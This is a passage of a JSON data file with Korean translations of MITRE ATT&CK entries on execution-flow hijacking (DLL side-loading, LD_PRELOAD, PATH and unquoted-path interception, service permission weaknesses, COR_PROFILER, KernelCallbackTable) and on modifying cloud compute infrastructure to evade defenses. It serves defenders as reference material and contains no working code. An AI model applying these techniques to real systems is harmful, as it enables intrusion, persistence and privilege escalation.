      "description": "적대 세력은 DLL을 사이드 로딩하여 자체 악성 페이로드를 실행할 수 있습니다. [DLL 검색 순서 하이재킹](https://attack.mitre.org/techniques/T1574/001)과 유사하게, 사이드 로딩은 프로그램이 로드하는 DLL을 하이재킹하는 방식입니다. 그러나 단순히 DLL을 프로그램의 검색 순서에 심고 피해자 응용 프로그램이 호출되기를 기다리는 것이 아니라, 적대 세력은 정당한 응용 프로그램을 심고 이를 호출하여 페이로드를 직접 사이드 로딩할 수 있습니다.\n\n사이드 로딩은 로더가 사용하는 DLL 검색 순서를 활용하여 피해자 응용 프로그램과 악성 페이로드를 나란히 위치시킴으로써 이루어집니다. 적대 세력은 사이드 로딩을 정당하고 신뢰할 수 있으며 잠재적으로 권한이 상승된 시스템 또는 소프트웨어 프로세스 하에 수행하는 활동을 은폐하는 수단으로 사용할 가능성이 높습니다. 페이로드를 사이드 로딩하는 데 사용되는 정상적인 실행 파일은 전달 및/또는 실행 중에 표시되지 않을 수 있습니다. 적대 세력의 페이로드는 또한 신뢰할 수 있는 프로세스의 메모리에 로드될 때까지 암호화되거나 패킹되거나 다른 방식으로 난독화될 수 있습니다. (출처: FireEye DLL 사이드 로딩)",
      "external_id": "T1574.002",
      "modified": "2023-03-30T21:01:47.241Z",
      "title": "DLL Side-Loading",
      "translated": true
    },
    {
      "description": "공격자는 희생자 애플리케이션이 실행 시간에 검색하는 경로에 예상되는 이름의 악성 동적 라이브러리(dylib)를 배치하여 자신의 페이로드를 실행할 수 있습니다. 동적 로더는 검색 경로의 순차적 순서에 따라 dylib를 찾으려고 시도합니다. dylib에 대한 경로는 <code>@rpath</code>로 접두사가 붙을 수 있으며, 이를 통해 개발자는 실행 파일의 위치 기반으로 런타임에 사용되는 검색 경로 배열을 지정할 수 있는 상대 경로를 사용할 수 있습니다. 또한, <code>LC_LOAD_WEAK_DYLIB</code>와 같은 약한 연결을 사용할 경우, 예상되는 dylib가 없더라도 애플리케이션은 여전히 실행됩니다. 약한 연결은 개발자가 새로운 API가 추가됨에 따라 여러 macOS 버전에서 애플리케이션을 실행할 수 있게 합니다.\n\n공격자는 식별된 경로에 누락된 dylib의 이름을 가진 악성 dylib를 삽입함으로써 실행을 얻을 수 있습니다.(인용: Wardle Dylib Hijack Vulnerable Apps)(인용: Wardle Dylib Hijacking OSX 2015)(인용: Github EmpireProject HijackScanner)(인용: Github EmpireProject CreateHijacker Dylib) dylib는 애플리케이션의 주소 공간에 로드되어 악성 dylib가 애플리케이션의 권한 수준과 자원을 상속받게 됩니다. 애플리케이션에 따라 이로 인해 권한 상승 및 무제한 네트워크 액세스가 발생할 수 있습니다. 이 방법은 실행이 합법적인 프로세스 아래에서 마스킹되기 때문에 보안 제품의 탐지를 회피할 수 있습니다.(인용: Writing Bad Malware for OSX)(인용: wardle artofmalware volume1)(인용: MalwareUnicorn macOS Dylib Injection MachO)",
      "external_id": "T1574.004",
      "modified": "2023-03-30T21:01:39.601Z",
      "title": "Dylib Hijacking",
      "translated": true
    },
    {
      "description": "적대적 행위자는 설치 프로그램에서 사용하는 바이너리를 탈취하여 자신의 악성 페이로드를 실행할 수 있습니다. 이러한 프로세스는 기능의 일환으로 또는 다른 작업을 수행하기 위해 특정 바이너리를 자동으로 실행할 수 있습니다. 타겟 바이너리가 포함된 파일 시스템 디렉터리의 권한이나 바이너리 자체의 권한이 부적절하게 설정된 경우, 타겟 바이너리는 사용자 수준의 권한으로 다른 바이너리로 덮어쓰여지고 원래 프로세스에 의해 실행될 수 있습니다. 원래 프로세스와 스레드가 더 높은 권한 수준에서 실행 중이라면, 교체된 바이너리도 시스템(HIGH Level) 권한을 포함한 높은 권한으로 실행됩니다.\n\n이 기술의 또 다른 변형은 실행 가능하고 자기 추출이 가능한 설치 프로그램에서 일반적으로 나타나는 취약점을 이용해 수행될 수 있습니다. 설치 과정 중에 설치 프로그램이 DLL, EXE 또는 기타 페이로드와 같은 바이너리를 압축 해제하기 위해 <code>%TEMP%</code> 디렉터리 내의 하위 디렉터리를 사용하는 것이 일반적입니다. 설치 프로그램이 하위 디렉터리 및 파일을 생성할 때, 종종 쓰기 접근을 제한할 적절한 권한을 설정하지 않아, 하위 디렉터리에 배치된 신뢰할 수 없는 코드가 실행되거나 설치 과정에서 사용되는 바이너리가 덮어쓰여질 수 있습니다. 이러한 동작은 [DLL 검색 순서 탈취](https://attack.mitre.org/techniques/T1574/001)와 관련이 있으며 이를 이용할 수 있습니다.\n\n적대적 행위자는 이 기술을 사용하여 정 legitimate 바이너리를 악성 바이너리로 교체하여 더 높은 권한 수준에서 코드를 실행할 수 있습니다. 일부 설치 프로그램은 또한 적대자가 제어하는 코드를 실행할 때 권한 승격이 발생하는 높은 권한을 요구할 수 있습니다. 이러한 동작은 [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1548/002)와 관련이 있습니다. 일반적으로 사용되는 설치 프로그램의 여러 예에서 이러한 취약점이 소프트웨어 공급업체에 보고되었습니다. (출처: mozilla_sec_adv_2012) (출처: 실행 가능한 설치 프로그램은 취약함) 실행 프로세스가 특정 시간이나 특정 이벤트(예: 시스템 부팅) 동안 실행되도록 설정되어 있는 경우, 이 기술은 지속성을 위해서도 사용할 수 있습니다.",
      "external_id": "T1574.005",
      "modified": "2020-03-26T19:20:23.030Z",
      "title": "Executable Installer File Permissions Weakness",
      "translated": true
    },
    {
      "description": "대적자는 동적 링커가 공유 라이브러리를 로드하는 데 사용하는 환경 변수를 하이재킹하여 자신만의 악성 페이로드를 실행할 수 있습니다. 프로그램의 실행 준비 단계에서는 동적 링커가 환경 변수 및 파일에서 지정된 공유 라이브러리의 절대 경로를 로드하는데, 이는 Linux의 `<code>LD_PRELOAD</code>` 또는 macOS의 `<code>DYLD_INSERT_LIBRARIES</code>`와 같은 변수들입니다. 환경 변수에 지정된 라이브러리는 먼저 로드되며, 동일한 함수 이름을 가진 시스템 라이브러리보다 우선합니다.(인용: Man LD.SO)(인용: TLDP Shared Libraries)(인용: Apple Doco Archive Dynamic Libraries) 이러한 변수는 개발자들이 바이너리를 재컴파일하지 않고도 디버깅 및 기호 충돌을 해결하고, 원래 라이브러리를 변경하지 않고 사용자 정의 함수를 구현하는 데 종종 사용됩니다.(인용: Baeldung LD_PRELOAD)\n\nLinux와 macOS에서 동적 링커 변수를 하이재킹하면 피해자 프로세스의 메모리, 시스템/네트워크 리소스에 접근하고, 가능하면 권한 상승을 얻을 수 있습니다. 이 방법은 실행이 정당한 프로세스 아래에 마스킹되므로 보안 제품의 탐지를 회피할 수도 있습니다. 대적자는 `<code>export</code>` 명령, `<code>setenv</code>` 함수 또는 `<code>putenv</code>` 함수를 사용하여 명령 줄을 통해 환경 변수를 설정할 수 있습니다. 대적자는 또한 [동적 링커 하이재킹](https://attack.mitre.org/techniques/T1574/006)을 이용하여 셸에서 변수를 내보내거나 Python의 `<code>os.environ</code>`과 같은 고급 구문을 사용하여 프로그래밍 방식으로 변수를 설정할 수 있습니다.\n\nLinux에서는 대적자가 `<code>LD_PRELOAD</code>`를 악성 라이브러리를 가리키도록 설정하여 피해자 프로그램이 요청하는 합법적인 라이브러리의 이름과 일치시키면, 피해자 프로그램 실행 시 운영 체제가 대적자의 악성 코드를 로드하게 됩니다. `<code>LD_PRELOAD</code>`는 환경 변수나 `<code>/etc/ld.so.preload</code>` 파일을 통해 설정할 수 있습니다.(인용: Man LD.SO)(인용: TLDP Shared Libraries) `<code>LD_PRELOAD</code>`로 지정된 라이브러리는 각각 `<code>dlopen()</code>` 및 `<code>mmap()</code>`에 의해 메모리로 로드되고 매핑됩니다.(인용: Code Injection on Linux and macOS)(인용: Uninformed Needle)(인용: Phrack halfdead 1997)(인용: Brown Exploiting Linkers)\n\nmacOS에서 이 동작은 Linux와 개념적으로 동일하지만, macOS 동적 라이브러리(dyld)가 하위 수준에서 구현되는 방식만 다릅니다. 대적자는 `<code>DYLD_INSERT_LIBRARIES</code>` 환경 변수를 설정하여 피해자 프로그램이 요청하는 합법적인 라이브러리 또는 함수의 이름을 포함한 악성 라이브러리로 가리키도록 할 수 있습니다.(인용: TheEvilBit DYLD_INSERT_LIBRARIES)(인용: Timac DYLD_INSERT_LIBRARIES)(인용: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass)",
      "external_id": "T1574.006",
      "modified": "2023-03-30T21:01:40.146Z",
      "title": "Dynamic Linker Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 라이브러리를 로드하는 데 사용되는 환경 변수를 탈취하여 자신들의 악성 페이로드를 실행할 수 있습니다. PATH 환경 변수는 운영 체제가 스크립트나 명령줄에서 호출된 바이너리를 찾기 위해 순차적으로 검색하는 디렉토리 목록을 포함하고 있습니다(사용자 및 시스템).\n\n공격자는 PATH 환경 변수에 저장된 디렉토리 목록의 앞쪽에 악성 프로그램을 배치하여 운영 체제가 해당 PATH 목록을 차례로 검색할 때 악성 바이너리 대신 정당한 바이너리를 실행하도록 만들 수 있습니다.\n\n예를 들어, Windows의 경우 공격자가 `C:\\example path`에 \"net.exe\"라는 악성 프로그램을 배치하면, PATH 환경 변수에서 기본적으로 `C:\\Windows\\system32\\net.exe`보다 앞에 위치하여 \"net\"이 명령줄에서 실행되었을 때 시스템의 정당한 실행 파일인 `C:\\Windows\\system32\\net.exe` 대신 `C:\\example path`가 호출됩니다. 프로그램 실행 방법 중 일부는 프로그램 경로가 지정되지 않을 경우 검색할 위치를 결정하기 위해 PATH 환경 변수에 의존합니다. 예를 들어, [명령 및 스크립트 인터프리터](https://attack.mitre.org/techniques/T1059)에서 프로그램을 실행할 때입니다.(출처: ExpressVPN PATH env Windows 2021)\n\n공격자는 또한 검색할 디렉토리를 지정하는 $PATH 변수를 직접 수정할 수 있습니다. 공격자는 `$PATH` 변수를 자신이 쓰기 권한이 있는 디렉토리를 가리키도록 수정할 수 있습니다. $PATH 변수를 사용하는 프로그램이 호출되면, 운영 체제는 지정된 디렉토리를 검색하고 악성 바이너리를 실행합니다. macOS에서는 $HOME 변수를 수정하여도 이러한 작업이 가능합니다. 이러한 변수는 명령줄, launchctl, [유닉스 쉘 설정 수정](https://attack.mitre.org/techniques/T1546/004)을 사용하거나 `/etc/paths.d` 폴더 내용을 수정하여 변경할 수 있습니다.(출처: uptycs Fake POC linux malware 2023)(출처: nixCraft macOS PATH variables)(출처: Elastic Rules macOS launchctl 2022)",
      "external_id": "T1574.007",
      "modified": "2023-10-03T03:29:57.078Z",
      "title": "Path Interception by PATH Environment Variable",
      "translated": true
    },
    {
      "description": "적대자는 다른 프로그램을 로드하는 데 사용되는 검색 순서를 해킹하여 자신의 악성 페이로드를 실행할 수 있습니다. 일부 프로그램이 전체 경로를 사용하여 다른 프로그램을 호출하지 않기 때문에, 적대자는 호출 프로그램이 위치한 디렉토리에 자신의 파일을 배치하여 운영 체제가 호출 프로그램의 요청에 따라 자신의 악성 소프트웨어를 실행하도록 유도할 수 있습니다.\n\n검색 순서 해킹은 적대자가 Windows가 경로가 지정되지 않은 프로그램을 검색하는 순서를 악용할 때 발생합니다. [DLL 검색 순서 해킹](https://attack.mitre.org/techniques/T1574/001)과는 달리, 프로그램을 실행하는 방법에 따라 검색 순서가 달라집니다. (인용: Microsoft CreateProcess) (인용: Windows NT Command Shell) (인용: Microsoft WinExec) 그러나 Windows가 각 경우에 초기화 프로그램의 디렉토리에서 검색한 후 Windows 시스템 디렉토리를 검색하는 것이 일반적입니다. 검색 순서 해킹에 취약한 프로그램(즉, 실행 파일의 경로를 지정하지 않는 프로그램)을 발견한 적대자는 잘못 지정된 프로그램과 같은 이름의 프로그램을 만들어 초기화 프로그램의 디렉토리에 배치함으로써 이 취약점을 이용할 수 있습니다.\n\n예를 들어, \"example.exe\"가 명령 줄 인수 <code>net user</code>와 함께 \"cmd.exe\"를 실행합니다. 적대자는 \"example.exe\"와 동일한 디렉토리에 \"net.exe\"라는 프로그램을 배치할 수 있으며, 이 경우 \"net.exe\" 대신 Windows 시스템 유틸리티인 net이 실행됩니다. 또한, 적대자가 \"net.exe\"와 동일한 디렉토리에 \"net.com\"이라는 프로그램을 배치하면, <code>cmd.exe /C net user</code>가 실행될 때, PATHEXT에 의해 정의된 실행 파일 확장자의 순서 때문에 \"net.com\"이 \"net.exe\" 대신 실행됩니다. (인용: Microsoft 환경 속성)\n\n검색 순서 해킹은 DLL 로드 해킹에도 일반적으로 사용되며, 이는 [DLL 검색 순서 해킹](https://attack.mitre.org/techniques/T1574/001)에서 다루어집니다.",
      "external_id": "T1574.008",
      "modified": "2024-09-12T15:25:57.059Z",
      "title": "Path Interception by Search Order Hijacking",
      "translated": true
    },
    {
      "description": "공격자는 취약한 파일 경로 참조를 탈취하여 자신만의 악성 페이로드를 실행할 수 있습니다. 공격자는 경로에 인용 부호가 없는 경우를 악용하여 자신의 실행 파일을 경로 내 상위 수준 디렉토리에 배치함으로써, Windows가 공격자의 실행 파일을 실행하도록 유도할 수 있습니다.\n\n서비스 경로(출처: Microsoft CurrentControlSet Services)와 바로 가기 경로 또한 경로에 하나 이상의 공백이 있고 인용 부호로 둘러싸여 있지 않은 경우 경로 탈취에 취약할 수 있습니다(예: <code>C:\\unsafe path with space\\program.exe</code> 대 <code>\"C:\\safe path with space\\program.exe\"</code>). (출처: Help eliminate unquoted path) (Windows 레지스트리 키에 저장됨) 공격자는 경로의 상위 수준 디렉토리에 실행 파일을 배치할 수 있으며, Windows는 의도한 실행 파일 대신 해당 실행 파일을 해석하게 됩니다. 예를 들어, 바로 가기에 있는 경로가 <code>C:\\program files\\myapp.exe</code>인 경우, 공격자는 <code>C:\\program.exe</code>에 프로그램을 생성하여 의도한 프로그램 대신 실행되도록 만들 수 있습니다. (출처: Windows Unquoted Services) (출처: Windows Privilege Escalation Guide)\n\n이 기술은 정기적으로 실행되는 실행 파일을 통해 지속성을 확보할 수 있으며, 더 높은 권한의 프로세스에 의해 시작된 인터셉트된 실행 파일을 통해 권한 상승에 사용할 수 있습니다.",
      "external_id": "T1574.009",
      "modified": "2023-03-30T21:01:35.788Z",
      "title": "Path Interception by Unquoted Path",
      "translated": true
    },
    {
      "description": "위협 행위자는 서비스에 의해 사용되는 바이너리를 해킹하여 자신의 악성 페이로드를 실행할 수 있습니다. 위협 행위자는 Windows 서비스의 권한 결함을 이용하여 서비스 시작 시 실행되는 바이너리를 교체할 수 있습니다. 이러한 서비스 프로세스는 기능의 일환으로 특정 바이너리를 자동으로 실행하거나 기타 작업을 수행할 수 있습니다. 만약 목표 바이너리가 포함된 파일 시스템 디렉토리의 권한이나 바이너리 자체의 권한이 잘못 설정되어 있다면, 목표 바이너리는 사용자 수준의 권한을 사용하여 다른 바이너리로 덮어쓰여지며 원래 프로세스에 의해 실행될 수 있습니다. 원래 프로세스와 스레드가 더 높은 권한 수준에서 실행 중이라면, 교체된 바이너리도 더 높은 권한 수준에서 실행되며, 이에는 SYSTEM 권한이 포함될 수 있습니다.\n\n위협 행위자는 이 기술을 사용하여 합법적인 바이너리를 악성 바이너리로 교체함으로써 더 높은 권한 수준에서 코드를 실행하려고 할 수 있습니다. 실행 프로세스가 특정 시간에 또는 특정 이벤트(예: 시스템 부팅) 동안 실행되도록 설정되어 있다면, 이 기술은 지속성을 위한 수단으로 사용될 수도 있습니다.",
      "external_id": "T1574.010",
      "modified": "2023-03-30T21:01:37.026Z",
      "title": "Services File Permissions Weakness",
      "translated": true
    },
    {
      "description": "적대자는 서비스를 사용하는 레지스트리 항목을 탈취하여 자신의 악성 페이로드를 실행할 수 있습니다. 그들은 서비스와 관련된 레지스트리 키의 권한 결함을 이용하여 원래 지정된 실행 파일에서 자신이 제어하는 파일로 리디렉션하여 서비스가 시작될 때 자신의 코드를 실행할 수 있습니다. Windows는 로컬 서비스 구성 정보를 레지스트리에 저장하며, 그 경로는 `<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>`입니다. 서비스의 레지스트리 키에 저장된 정보는 서비스 컨트롤러, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1059/001), 또는 [Reg](https://attack.mitre.org/software/S0075)와 같은 도구를 사용하여 서비스의 실행 매개변수를 수정하는 데 조작될 수 있습니다. 레지스트리 키에 대한 접근은 접근 제어 목록과 사용자 권한을 통해 제어됩니다. (인용: Registry Key Security)(인용: malware_hides_service)\n\n사용자 및 그룹에 대한 권한이 제대로 설정되지 않고 서비스의 레지스트리 키에 접근이 허용되면, 적대자는 서비스의 binPath/ImagePath를 자신이 제어하는 다른 실행 파일을 가리키도록 변경할 수 있습니다. 서비스가 시작되거나 재시작될 때 적대자 제어 프로그램이 실행되며, 이를 통해 적대자는 지속성을 확립하고/또는 서비스가 실행될 계정 컨텍스트(로컬/도메인 계정, SYSTEM, LocalService 또는 NetworkService)로 권한 상승을 할 수 있습니다.\n\n적대자는 또한 서비스의 레지스트리 트리에서 다른 레지스트리 키를 변경할 수 있습니다. 예를 들어, `<code>FailureCommand</code>` 키를 변경하여 서비스가 실패하거나 의도적으로 손상될 때마다 서비스가 상승된 컨텍스트에서 실행되도록 설정할 수 있습니다. (인용: Kansa Service 관련 수집기)(인용: Tweet Registry Perms Weakness)\n\n`<code>Performance</code>` 키에는 드라이버 서비스의 성능 DLL 이름과 DLL에서 내보낸 여러 함수의 이름이 포함되어 있습니다. (인용: microsoft_services_registry_tree) `<code>Performance</code>` 키가 이미 존재하지 않거나 적대자가 제어하는 사용자가 `<code>Create Subkey</code>` 권한을 가지고 있다면, 적대자는 서비스의 레지스트리 트리에 악성 DLL을 가리키는 `<code>Performance</code>` 키를 생성할 수 있습니다. (인용: insecure_reg_perms)\n\n적대자는 또한 드라이버별 데이터를 저장하는 `<code>Parameters</code>` 키를 추가하거나 악성 서비스의 지속성을 확립하거나 다른 악성 활동을 가능하게 하기 위한 다른 사용자 지정 하위 키를 추가할 수 있습니다. (인용: microsoft_services_registry_tree)(인용: troj_zegost) 또한, 적대자가 svchost.exe를 사용하여 악성 서비스를 실행하면, 서비스 파일은 `<code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>`를 사용하여 식별될 수 있습니다. (인용: malware_hides_service)",
      "external_id": "T1574.011",
      "modified": "2024-09-12T19:42:48.016Z",
      "title": "Services Registry Permissions Weakness",
      "translated": true
    },
    {
      "description": "공격자는 .NET CLR을 로드하는 프로그램의 실행 흐름을 탈취하기 위해 COR_PROFILER 환경 변수를 활용할 수 있습니다. COR_PROFILER는 개발자가 각 .NET 프로세스에 로드될 비관리 DLL(또는 .NET 외부의 프로파일링 DLL)을 지정할 수 있게 해주는 .NET Framework 기능입니다. 이러한 프로파일러는 .NET CLR에서 실행되는 관리 코드를 모니터링, 문제 해결 및 디버깅하기 위해 설계되었습니다. (참고: Microsoft Profiling Mar 2017)(참고: Microsoft COR_PROFILER Feb 2013)\n\nCOR_PROFILER 환경 변수는 시스템, 사용자 또는 프로세스와 같은 다양한 범위에서 설정할 수 있으며, 이는 서로 다른 영향 수준을 초래합니다. 시스템 및 사용자 전체의 환경 변수 범위는 레지스트리에 지정되며, 여기에서 [컴포넌트 오브젝트 모델](https://attack.mitre.org/techniques/T1559/001) (COM) 객체가 프로파일러 DLL로 등록될 수 있습니다. 프로세스 범위의 COR_PROFILER는 레지스트리를 수정하지 않고도 메모리 내에서 생성할 수 있습니다. .NET Framework 4부터는, COR_PROFILER_PATH 환경 변수에 DLL의 위치가 지정되는 한, 프로파일링 DLL을 등록할 필요가 없습니다. (참고: Microsoft COR_PROFILER Feb 2013)\n\n공격자는 COR_PROFILER를 악용하여 CLR이 호출될 때마다 모든 .NET 프로세스의 맥락에서 악성 DLL이 실행되도록 지속성을 구축할 수 있습니다. 또한, COR_PROFILER는 피해자의 .NET 프로세스가 더 높은 권한 수준에서 실행될 경우 권한 상승(예: [사용자 계정 컨트롤 우회](https://attack.mitre.org/techniques/T1548/002))을 수행하거나, .NET 프로세스가 제공하는 [방어막을 저해](https://attack.mitre.org/techniques/T1562)하는 데 사용될 수 있습니다. (참고: RedCanary Mockingbird May 2020)(참고: Red Canary COR_PROFILER May 2020)(참고: Almond COR_PROFILER Apr 2019)(참고: GitHub OmerYa Invisi-Shell)(참고: subTee .NET Profilers May 2017)",
      "external_id": "T1574.012",
      "modified": "2021-08-30T21:35:12.049Z",
      "title": "COR_PROFILER",
      "translated": true
    },
    {
      "description": "공격자는 자신의 페이로드를 실행하기 위해 프로세스의 실행 흐름을 가로채기 위해 <code>KernelCallbackTable</code>를 악용할 수 있습니다.(인용: Lazarus APT 2022년 1월) <code>KernelCallbackTable</code>는 프로세스 환경 블록(PEB)에서 발견되며, <code>user32.dll</code>이 로드되면 GUI 프로세스에서 사용할 수 있는 그래픽 함수 배열로 초기화됩니다.(인용: Windows Process Injection KernelCallbackTable)\n\n공격자는 악성 페이로드로 원래의 콜백 함수를 대체하여 <code>KernelCallbackTable</code>를 사용해 프로세스의 실행 흐름을 가로챌 수 있습니다. 콜백 함수의 수정은 [반사 코드 로딩(Reflective Code Loading)](https://attack.mitre.org/techniques/T1620) 또는 다른 프로세스에 대한 [프로세스 인젝션(Process Injection)](https://attack.mitre.org/techniques/T1055)과 같은 관련 동작을 포함하는 다양한 방법으로 수행할 수 있습니다.\n\n<code>KernelCallbackTable</code>의 메모리 주소에 대한 포인터는 PEB를 찾아서 얻을 수 있습니다 (예: <code>NtQueryInformationProcess()</code> [네이티브 API](https://attack.mitre.org/techniques/T1106) 함수를 호출하여).(인용: NtQueryInformationProcess) 포인터를 찾은 후 <code>KernelCallbackTable</code>를 복제하고 테이블의 함수(예: <code>fnCOPYDATA</code>)를 악성 페이로드의 주소로 설정할 수 있습니다 (예: <code>WriteProcessMemory()</code>를 통해). 그런 다음 PEB가 테이블의 새 주소로 업데이트됩니다. 변조된 함수가 호출되면 악성 페이로드가 실행됩니다.(인용: Lazarus APT 2022년 1월)\n\n변조된 함수는 일반적으로 Windows 메시지를 사용해 호출됩니다. 프로세스가 가로채지고 악성 코드가 실행된 후, <code>KernelCallbackTable</code>는 악성 페이로드의 나머지 부분에 의해 원래 상태로 복원될 수 있습니다.(인용: Lazarus APT 2022년 1월) <code>KernelCallbackTable</code>를 사용하여 실행 흐름을 가로채는 것은 실행이 합법적인 프로세스 아래에서 숨길 수 있기 때문에 보안 제품의 탐지를 피할 수 있습니다.",
      "external_id": "T1574.013",
      "modified": "2022-03-22T15:47:33.915Z",
      "title": "KernelCallbackTable",
      "translated": true
    },
    {
      "description": "적대적인 공격자는 .NET `AppDomainManager`가 어셈블리를 로드하는 방식을 가로채어 자신의 악성 페이로드를 실행할 수 있습니다. .NET 프레임워크는 `AppDomainManager` 클래스를 사용하여 프로세스 내에서 하나 이상의 격리된 실행 환경(응용 프로그램 도메인이라고 함)을 생성하고 관리하여 .NET 애플리케이션 실행을 호스팅합니다. 어셈블리(`.exe` 또는 `.dll` 바이너리)는 실행 가능한 코드로서 애플리케이션 도메인에 로드될 수 있습니다. (출처: Microsoft App Domains)\n\n\"AppDomainManager 주입\"이라고 알려진 이 기법을 통해 공격자는 .NET 애플리케이션의 어셈블리 로드 방식을 가로채어 임의의 코드를 실행할 수 있습니다. 예를 들어, 악성코드는 대상 프로세스 내부에 사용자 정의 애플리케이션 도메인을 생성하여 임의의 어셈블리를 로드하고 실행할 수 있습니다. 또는, .NET 런타임 설정을 정의하는 구성 파일(`.config`)이나 프로세스 환경 변수가 변조되어 일반적으로 무해한 .NET 애플리케이션이 악성 어셈블리(이름으로 식별됨)를 대상 프로세스에 로드하도록 지시할 수 있습니다. (출처: PenTestLabs AppDomainManagerInject)(출처: PwC Yellow Liderc)(출처: Rapid7 AppDomain Manager Injection)",
      "external_id": "T1574.014",
      "modified": "2024-04-28T15:44:25.342Z",
      "title": "AppDomainManager",
      "translated": true
    },
    {
      "description": "적대자는 방어를 회피하기 위해 클라우드 계정의 컴퓨팅 서비스 인프라를 수정하려고 시도할 수 있습니다. 컴퓨팅 서비스 인프라의 수정에는 컴퓨팅 인스턴스, 가상 머신 및 스냅샷과 같은 하나 이상의 구성 요소의 생성, 삭제 또는 수정이 포함될 수 있습니다.\n\n인프라 구성 요소의 수정에서 얻은 권한은 기존 인프라에 대한 접근을 차단하는 제한을 우회할 수 있습니다. 인프라 구성 요소를 수정하면 적대자가 탐지를 피하고 자신의 존재에 대한 증거를 제거할 수 있는 기회를 제공할 수 있습니다. (출처: Mandiant M-Trends 2020)",
      "external_id": "T1578",
      "modified": "2024-09-30T13:28:37.414Z",
      "title": "Modify Cloud Compute Infrastructure",
      "translated": true
    },
    {
      "description": "적대자는 방어를 피하기 위해 클라우드 계정 내에서 스냅샷이나 데이터 백업을 생성할 수 있습니다. 스냅샷은 가상 머신(VM), 가상 하드 드라이브 또는 볼륨과 같은 기존의 클라우드 컴퓨팅 구성 요소의 시점 복사본입니다. 적대자는 기존의 컴퓨팅 서비스 인프라에 대한 접근을 차단하는 제한을 우회하기 위해 권한을 활용하여 스냅샷을 생성할 수 있으며, 이는 적대자가 스냅샷으로 되돌려 감지를 피하고 자신의 존재에 대한 증거를 제거할 수 있는 [클라우드 인스턴스 재설정(Revert Cloud Instance)](https://attack.mitre.org/techniques/T1578/004) 와는 다릅니다.\n\n적대자는 [클라우드 인스턴스 생성(Create Cloud Instance)](https://attack.mitre.org/techniques/T1578/002)를 실행하고, 생성한 스냅샷을 해당 인스턴스에 마운트한 후, 인바운드 및 아웃바운드 SSH 접근을 허용하는 방화벽 정책과 같은 접근 정책을 적용하여 생성된 인스턴스에 대한 접근을 허용할 수 있습니다. (출처: Mandiant M-Trends 2020)",
      "external_id": "T1578.001",
      "modified": "2024-10-15T15:53:44.870Z",
      "title": "Create Snapshot",
      "translated": true
    },
    {
      "description": "공격자는 방어망을 회피하기 위해 클라우드 계정의 컴퓨팅 서비스 내에서 새로운 인스턴스 또는 가상 머신(VM)을 생성할 수 있습니다. 새로운 인스턴스를 생성함으로써 공격자는 현재 계정 내에 있는 인스턴스에서 설정된 방화벽 규칙과 권한을 우회할 수 있습니다. 공격자는 [스냅샷 생성](https://attack.mitre.org/techniques/T1578/001)을 통해 계정의 하나 이상의 볼륨의 스냅샷을 만든 후, 새로운 인스턴스를 생성하고 스냅샷을 마운트한 다음, 보다 제한적인 보안 정책을 적용하여 [로컬 시스템에서 데이터 수집](https://attack.mitre.org/techniques/T1005) 또는 [원격 데이터 스테이징](https://attack.mitre.org/techniques/T1074/002)을 수행할 수 있습니다. (출처: Mandiant M-Trends 2020)\n\n새로운 인스턴스를 생성하면 공격자가 현재 실행 중인 인스턴스의 실행에 영향을 주지 않고 환경 내에서 악의적인 활동을 수행할 수 있는 가능성이 높아집니다.",
      "external_id": "T1578.002",
      "modified": "2024-09-30T13:28:37.416Z",
      "title": "Create Cloud Instance",
      "translated": true
    },
    {
      "description": "적의는 악의적인 활동을 수행한 후 클라우드 인스턴스를 삭제하여 탐지를 피하고 그들의 존재에 대한 증거를 제거하려 할 수 있습니다. 인스턴스나 가상 머신을 삭제하는 것은 회복할 수 없는 경우, 귀중한 포렌식 아티팩트 및 의심스러운 행동의 다른 증거를 제거할 수 있습니다.\n\n또한 적의는 [클라우드 인스턴스 생성](https://attack.mitre.org/techniques/T1578/002) 후 그들의 목표를 달성한 후 인스턴스를 종료할 수도 있습니다. (출처: Mandiant M-Trends 2020)",
      "external_id": "T1578.003",
      "modified": "2024-09-30T13:28:37.415Z",
      "title": "Delete Cloud Instance",
      "translated": true
    },
    {
      "description": "적대자는 악의적인 활동을 수행한 후 클라우드 인스턴스에서 변경된 내용을 다시 되돌려 감추기 위해 탐지를 회피하고 자신의 존재에 대한 증거를 제거하려고 할 수 있습니다. 클라우드 기반 인프라와 같은 높은 가상화 환경에서는 클라우드 관리 대시보드나 클라우드 API를 통해 가상 머신(VM) 또는 데이터 스토리지 스냅샷을 복원함으로써 이를 달성할 수 있습니다.\n\n이 기술의 또 다른 변형은 컴퓨트 인스턴스에 연결된 임시 저장소를 사용하는 것입니다. 대부분의 클라우드 제공업체는 지속적, 로컬 및/또는 임시 저장소를 포함하여 다양한 유형의 저장소를 제공하며, 임시 저장소 유형은 VM을 중지/재시작할 때 종종 초기화됩니다.",
      "external_id": "T1578.004",
      "modified": "2021-03-08T10:33:02.128Z",
      "title": "Revert Cloud Instance",
      "translated": true
    },
    {
      "description": "적대 세력은 방어를 피하기 위해 클라우드 컴퓨팅 인프라의 크기, 위치 및 사용 가능한 리소스에 직접 영향을 미치는 설정을 수정할 수 있습니다. 이러한 설정은 서비스 쿼터, 구독 연관, 테넌트 전체 정책 또는 사용 가능한 컴퓨팅에 영향을 미치는 기타 구성이 포함될 수 있습니다. 이러한 수정은 적대 세력이 피해자의 컴퓨팅 리소스를 남용하여 목표를 달성할 수 있게 하며, 실행 중인 인스턴스의 실행에 영향을 미치지 않거나 피해자에게 자신의 활동을 드러내지 않고 수행할 수 있습니다.\n\n예를 들어, 클라우드 제공업체는 종종 고객의 컴퓨팅 리소스 사용을 쿼터를 통해 제한합니다. 고객은 증가하는 컴퓨팅 요구를 지원하기 위해 이러한 쿼터 조정을 요청할 수 있으며, 이러한 조정은 클라우드 제공업체의 승인이 필요할 수 있습니다. 클라우드 환경을 타협한 적대 세력은 의심을 사지 않고 피해자의 전체 쿼터를 소진하여 추가 [리소스 하이재킹](https://attack.mitre.org/techniques/T1496)을 가능하게 하기 위해 쿼터 조정을 요청할 수 있습니다. (출처: Microsoft Cryptojacking 2023) 또한 적대 세력은 배포된 가상 머신의 크기를 제한하는 모든 테넌트 전체 정책을 수정하여 허용된 리소스 사용을 증가시킬 수 있습니다. (출처: Microsoft Azure Policy)\n\n또한 적대 세력은 클라우드 리소스를 배포할 수 있는 위치에 영향을 미치는 설정을 